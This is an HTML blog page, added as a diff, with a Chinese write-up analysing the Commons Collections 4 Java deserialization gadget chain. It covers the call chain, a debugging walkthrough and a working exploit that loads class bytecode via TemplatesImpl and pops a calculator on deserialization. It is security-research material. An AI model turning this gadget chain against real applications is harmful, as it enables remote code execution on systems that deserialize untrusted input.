@@ -1,0 +1,872 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言CommonsCollections4 除 4.0 的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。所以在本链中不会用到InvokerTransformer，替代的，会使用cc3中出现的instantiateTransformer这个类,也就是加载字节码这个方法 调用链cc4这次前半段与之前区别有点大，所以先给出调用链 1234567">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CC4反序列化链分析">
+<meta property="og:url" content="http://example.com/2024/10/15/CC4/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言CommonsCollections4 除 4.0 的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。所以在本链中不会用到InvokerTransformer，替代的，会使用cc3中出现的instantiateTransformer这个类,也就是加载字节码这个方法 调用链cc4这次前半段与之前区别有点大，所以先给出调用链 1234567">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/2024/1733054711166-dfa29de0-3c0d-46ba-ba71-fb982a245ff7.png">
+<meta property="og:image" content="http://example.com/images/2024/1733055490336-c3d3bb3c-949c-4d89-8713-0e580f8fea04.png">
+<meta property="og:image" content="http://example.com/images/2024/1733055284469-04e51e39-4bf4-44ba-91a3-2e037dcb84ee.png">
+<meta property="og:image" content="http://example.com/images/2024/1733055532668-eebde6ef-cca0-452b-9565-1ecf08b9e5bd.png">
+<meta property="og:image" content="http://example.com/images/2024/1733055550816-1fdbc1fc-254e-4089-9161-c05dc2d941b4.png">
+<meta property="og:image" content="http://example.com/images/2024/1733055582830-64984af8-7bda-44f6-a81a-a29af68d2b0a.png">
+<meta property="og:image" content="http://example.com/images/2024/1733055891776-0a1a4f9c-517b-46dd-a0aa-a957970dc2f7.png">
+<meta property="og:image" content="http://example.com/images/2024/1733055909930-ba201323-d834-44d2-a912-cdbc893c6f65.png">
+<meta property="og:image" content="http://example.com/images/2024/1733111184317-c92b61bf-8a0e-4775-a7cc-1748b12d513b.png">
+<meta property="og:image" content="http://example.com/images/2024/1733111249078-4330c79c-29fd-4fac-877a-9bcc7f3fc66a.png">
+<meta property="og:image" content="http://example.com/images/2024/1733112604855-180fb701-ddf1-49f2-ab06-8454c70193ab.png">
+<meta property="article:published_time" content="2024-10-15T07:30:00.000Z">
+<meta property="article:modified_time" content="2026-03-18T01:53:08.050Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="安全研究">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/2024/1733054711166-dfa29de0-3c0d-46ba-ba71-fb982a245ff7.png">
+  
+  
+  
+  <title>CC4反序列化链分析 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Change</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CC4反序列化链分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-10-15 15:30" pubdate>
+          2024年10月15日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          29 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CC4反序列化链分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CommonsCollections4 除 4.0 的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。所以在本链中不会用到InvokerTransformer，替代的，会使用cc3中出现的instantiateTransformer这个类,也就是加载字节码这个方法</p>
+<h1 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h1><p>cc4这次前半段与之前区别有点大，所以先给出调用链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">PriorityQueue.readObject()<br>  PriorityQueue.heapify()<br>    PriorityQueue.siftDown()<br>      PriorityQueue.siftDownUsingComparator()<br>        TransformingComparator.compare()         <br>          ChainedTransformer.transform()<br>            instantiateTransformer.transform()<br>                new TrAXFilter<br>                    TemplatesImpl.newTransformer  <br></code></pre></td></tr></table></figure>
+
+<h1 id="链条分析"><a href="#链条分析" class="headerlink" title="链条分析"></a>链条分析</h1><p>分歧点主要出现在ChainedTransformer.transform()之前，这里用到了TransformingComparator类。</p>
+<p>这个类还是很简单的，就两个构造方法，和一个compare方法，类和参数都可控，没什么好说的</p>
+<!-- 这是一张图片，ocr 内容为：子 COMPARATOR DECORATED) PUBLIC TRANSFORMER, TRANSFORMINGCOMPARATOR(TRANSFORMER THIS.DECORATED DECORATED; THIS.TRA TRANSFORMER; SFORMER RETURNS THE RESULT OF COMPARING THE VALUES FROM THE TRANSFORM OPERATION. OBJ1 - THE FIRST OBJECT TO TRANSFORM THEN COMPARE 形参:0L OBJ2 - THE SECOND OBJECT TO TRANSFORM THEN COMPARE 返回值:NEGATIVE IF OBJ1IS LESS,POSITIVE IF GREATER,ZERO IF EQUAL C INT COMPARE(OBJECT OBJ1, OBJECT OBJ2) { PUBLIC MER.TRANSFORM(OBJ1); OBJECT VALUE1 THIS.TRANSFORMER.T THIS.TRANSFORMER.TRANSFORM(OBJ2); OBJECT VALUE2 AS.DECORATED.COMPARE(VALUEL, VALUE2); THIS.DE RETURN -->
+<p><img src="/images/2024/1733054711166-dfa29de0-3c0d-46ba-ba71-fb982a245ff7.png" srcset="/img/loading.gif" lazyload></p>
+<p> 查找compare的用法，能看到PriorityQueue.siftUpUsingComparator（注意是siftDown）存在调用任意类的compare方法</p>
+<!-- 这是一张图片，ocr 内容为：/UNCHECKED/ PRIVATE VOID SIFTDOWNUSINGCOMPARATOR(INT K, E X) {  INT HALF : SIZE 1;  WHILE (K < HALF) { < << 1) + 1; (K) INT CHILD  OBJECT C : QUEUE[CHILD]; INT RIGHT : CHILD + 1; (RIGHT < SIZE && IF (  QUEUE[RIGHT]) > 0) COMPARATOR.COMPARE((E) C, (E) RIGHT];  C : QUEUE[CHILD  IF (COMPARATOR.COMPARE(X RE(X, (E) C) <三 0) BREAK ; QUEUE[K] ; C; K ; CHILD; 子 QUEUE[K]:X; -->
+<p><img src="/images/2024/1733055490336-c3d3bb3c-949c-4d89-8713-0e580f8fea04.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为：PUBLIC PRIORITYQUEVE(INT INITIALCAPACITY, COMPARATOR) }( COMPARATOR<? SUPER E> NOTE: THIS RESTRICTION OF AT LEAST ONE IS NOT ACTUALLY NEEDED, // BUT CONTINUES FOR 1.5 COMPATIBILITY IF (INITIALCAPACITY < 1) THROW NEW ILLEGALARGUMENTEXCEPTION(); THIS.QUEVE - NEW OBJECT[INITIALCAPACITY];  THIS.COMPARATOR : CO COMPARATOR; -->
+<p><img src="/images/2024/1733055284469-04e51e39-4bf4-44ba-91a3-2e037dcb84ee.png" srcset="/img/loading.gif" lazyload></p>
+<p>因为作用域的原因还得一步步往上走。</p>
+<!-- 这是一张图片，ocr 内容为： PRIVATE VOID SIFTDOWN(INT K, E X) {  IF (COMPARATOR (TTNU :I SIFTDOWNUSINGCOMPARATOR(K, ELSE SIFTDOWNCOMPARABLE(K, X); -->
+<p><img src="/images/2024/1733055532668-eebde6ef-cca0-452b-9565-1ecf08b9e5bd.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： PRIVATE VOID HEAPIFY() {  FOR (INT I : (SIZE >> 1) - 1; I >: 0; I--) SIFTDOWN(I, (E) QUEVE[I]); -->
+<p><img src="/images/2024/1733055550816-1fdbc1fc-254e-4089-9161-c05dc2d941b4.png" srcset="/img/loading.gif" lazyload></p>
+<p>在同一个类徘徊最后直接走到了readObject方法，那这就是入口类了</p>
+<!-- 这是一张图片，ocr 内容为：PRIVATE VOID READOBJECT(JAVA.IO.OBJECTINPUTSTREAM M S) THROWS JAVA.IO.IOEXCEPTION, CLASSNOTFOUNDEXCEPTION // READ IN SIZE, AND AN D ANY HIDDEN STUFF S.DEFAULTREADOBJECT(); READ IN (AND DISCARD) ARRAY LENGTH S.READINT();  QUEVE 三 NEW OBJECT[SIZE]; / READ IN ALL ELEMENTS. FOR (INT I 三 0; I < SIZE; I++) S.READOBJECT(); QUEUE[I] / ELEMENTS ARE GUARANTEED TO BE I TO BE IN 'PROPER ORDER'", BUT THE // SPEC HAS NEVER EXPLAINED WHAT THAT MIGHT BE. HEAPIFY(); -->
+<p><img src="/images/2024/1733055582830-64984af8-7bda-44f6-a81a-a29af68d2b0a.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h1><p> 前半新用到的类就TransformingComparator和PriorityQueue，我们到它们的构造方法里看看</p>
+<!-- 这是一张图片，ocr 内容为：COMPARATOR DECORATED) PUBLIC TRANSFORMINGCOMPARATOR(TRANSFORMER TRANSFORMER, THIS.DECORATED DECORATED; THIS.TRANSFORMER 三 TRANSFORMER; -->
+<p><img src="/images/2024/1733055891776-0a1a4f9c-517b-46dd-a0aa-a957970dc2f7.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为：PRIORITYQUEUE(INT INITIALCAPACITY, PUBLIC  COMPARATOR<? SUPER E> COMPARATOR) { / NOTE: THIS RE IS RESTRICTION OF AT LEAST ONE IS NOT ACTUALLY NEEDED, // BUT CONTINUES FOR 1.5 COMPATIBILITY  IF (INITIALCAPACITY < 1) THROW NEW ILLEGALARGUMENTEXCEPTION(); THIS.QUEUE : NEW OBJECT[INITIALCAPACITY]; THIS.COMPARATOR ; COMPARATOR; -->
+<p><img src="/images/2024/1733055909930-ba201323-d834-44d2-a912-cdbc893c6f65.png" srcset="/img/loading.gif" lazyload></p>
+<p>因为就两个类，构造起来很简单</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//实例化TransformingComparator</span><br>TransformingComparator transformingComparator=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br><br><span class="hljs-comment">//测试连接，compare的传参无所谓</span><br><span class="hljs-comment">//transformingComparator.compare(1,2);</span><br><br>PriorityQueue priorityQueue=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>,transformingComparator);<br></code></pre></td></tr></table></figure>
+
+<p>现在调试一下，在入口调用的第一个方法下断点，看看类能不能顺利走完</p>
+<!-- 这是一张图片，ocr 内容为：OBJECTINPUTSTREAM0755 779 READOBJECT(JAVA.IO.0BJECTINPUTSTREAM PRIVATE VOID JAVA.IO.IOEXCEPTION, CLASSNOTFOUNDEXCEPTION THROWS 780 READ IN SIZE, AND ANY HIDDEN S 781 STUFF 782 S.DEFAULTREADOBJECT(); 783 READ IN (AND DISCARD) ARRAY LENGTH 784 S.READINT(); 785 786 787  QUEUE ; NEW OBJECT[SIZE]; 788  READ IN ALL ELEMENTS. 789 (INT I ; 0; I < SIZE; I++) SIZE:0 790 FOR QUEUE: OBJECT[0L@756  S.READOBJECT(); S: 0BJECTINPUTSTREAM@755 791 QUEUE[I] 792 // ELEMENTS ARE GUARANTEED TO IN 793 "PROPER ORDER", BUT THE D TO BE LAINED  SPEC HAS NEVER EXP MIGHT BE. WHAT THAT 794 HEAPIFY(); 796 -->
+<p><img src="/images/2024/1733111184317-c92b61bf-8a0e-4775-a7cc-1748b12d513b.png" srcset="/img/loading.gif" lazyload></p>
+<p>第二步就停下了</p>
+<!-- 这是一张图片，ocr 内容为：/UNCHECREU/  PRIVATE VOID HEAPIFY() {  FOR (INT I : (SIZE >>> 1) - ) - 1; I >: 0; I--) SIZE:0 QUEUE[I]); SIFTDOWN(I, (E) QUEUE: OBJECT[OL@756 -->
+<p><img src="/images/2024/1733111249078-4330c79c-29fd-4fac-877a-9bcc7f3fc66a.png" srcset="/img/loading.gif" lazyload></p>
+<p>查阅资料可知&gt;&gt;&gt;是移位运算符，用于处理二叉堆，用于整数相当于将其除以2。首先想到的是反射修改size的大小，可是修改的值大于1就会出现ArrayIndexOutOfBoundsException异常，索引超出的数组的大小，所以size应该跟数组的大小有关</p>
+<p>了解了下PriorityQueue类，发现这是一个控制队列的类(实现了基于优先级堆的优先队列),使用offer方法插入数据即可改变数组的大小。</p>
+<p>写完就弹计算器了，但报错了</p>
+<!-- 这是一张图片，ocr 内容为：POM.XML.CC) 项目 CHAINEDTRANSTORMER JAVA PRIORITYQUEUE JAVA CC4.LAVE NATIVEMETHODACCES TRANSFORMINGCOMPARATOR JAVA CCTIRANSIONMEAMAP PUBLIC CLASS CC4 1 42543X3人Y CC3 C CC4 PRIOR.TYYUEUE.9RRES/L AN: 69 PRIORITYQUEUE.OFFER(E 2); CCC6 203 计算器 M 结构 HHWHHHHHAMBWWW的的阳的的 标准男 8 P CC4  SERIALIZE(PRIORITYQUEUE); UNSERIALIZE( FLENAME "SER.BIN'); R 0 UNSENTALIZE(STRINGL:OBJED PUBLIC STATIC VOID SERIALIZE(OBJECT OBJ) THROWS IOEXCEPTIAN ( 1个用云 M- MS ML OBJECTOUTPUTSTREAM OOS.E NEW OBJECTOUTPUTSTREAM(NEW FILEOUTPUTSTREAM( NA OOS.WRITEOBJECT(OBJ); CE PUBLIC STATIC OBJECT UNSERIALIZE(STRING FILENAME) THROWS IOEXCEPTION, C ON,CLASSN OBJECTINPUTSTREAM GIS : NEW OBJECTINPUTSTREAM(NEW FILEINPUTSTREAN(FILEND 6 7 X 8  OBJECT OBJ - OIS.READOBJECT(); RETURN ABJ; 5 9 4 - 2 3 1 + 0 4 调试 B 控制台 "E:\安全工只\RE_JAVA - 到本\JAVA_8U65_NEW\JRE\BIN\JAVA.EXE" 口过接到绝址为 "127.0.1:55595",传输:'套按字" 的目标店识机 个 AF ARG:APUCHA:COMWANS:COLEETLEETIONS6,FUNGTORS,INSTANEIATEFRANSFORUER;TRANSFORE(TNSTATETRANS[ORNUR- J 不三 AT ORG,EPACHE.COMMONS,COLLECTIONS6,FUNCTORS:INATANTIOTETRANSFORMER, TRANSFORN  TUETANTIATETRANER, 1AV 吧 AT ARG-APACHA.COMMONS.COLLECTIONSA,FUNGTORS,CHAINEDTRANSFORMER,TRANSFORMCCHAINEDTRANSFARMER, JAVA;117 四 自 AT ORG-APACHA.COMMONSFORPARETOCTIONAS.COMPARATORS, JRENSFORAANGCONPARETOR-CONPARE   TRANGERETOS- IAVA AT JAVA.UTIL.PRIORITYQUEUE.SIFTUPUSINGCOMPARATOR(PRIORITYQUGUE.JAVA:669) O AT JAVA.UTIT.PRIORITYQUEUE.SIFTUP(PRIORITVQUEUE.JAVE:645) AT JAVA.UTIL.PRITYQUEUEUE.OFFER(PRIGRITYQUEUE.JAVA:344) 9% "S MA AM,".INGAS DUSESTA) -->
+<p><img src="/images/2024/1733112604855-180fb701-ddf1-49f2-ab06-8454c70193ab.png" srcset="/img/loading.gif" lazyload></p>
+<p>在offer处下断点，发现直接进到了compare方法，表示还没序列化程序就结束了。</p>
+<p><font style="color:rgb(80, 80, 92);"> 看了博客说是因为</font><code>_tfactory</code><font style="color:rgb(80, 80, 92);"> 为 null导致空指针异常，而</font><code>_tfactory</code>要反序列化时才能加进来，所以我们得先执行offer，再反射往类里添加参数，使链条完整。</p>
+<h1 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException, TransformerConfigurationException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class templatesClass=templates.getClass();<br><br>        <span class="hljs-comment">//修改_name</span><br>        Field nameField=templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;Ch4nge&quot;</span>);<br><br>        <span class="hljs-comment">//修改_tfactory</span><br>        Field tfactoryField=templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//往_bytecodes传入字节数组</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">byte</span>[]  bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] bytecodesArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytecodes&#125;;<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodesField.set(templates, bytecodesArray);<br><br>        <span class="hljs-comment">//调用方法</span><br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        InstantiateTransformer instantiateTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <span class="hljs-comment">//instantiateTransformer.transform(TrAXFilter.class);</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer,<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">//实例化TransformingComparator</span><br>        TransformingComparator transformingComparator=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">//测试连接，compare的传参无所谓</span><br>        <span class="hljs-comment">//transformingComparator.compare(1,2);</span><br><br>        PriorityQueue priorityQueue=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.offer(<span class="hljs-number">1</span>);<br>        priorityQueue.offer(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">//反射传入chainedTransformer</span><br>        Class TransformerClass=transformingComparator.getClass();<br>        Field sizeField=TransformerClass.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        sizeField.setAccessible(<span class="hljs-literal">true</span>);<br>        sizeField.set(transformingComparator,chainedTransformer);<br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
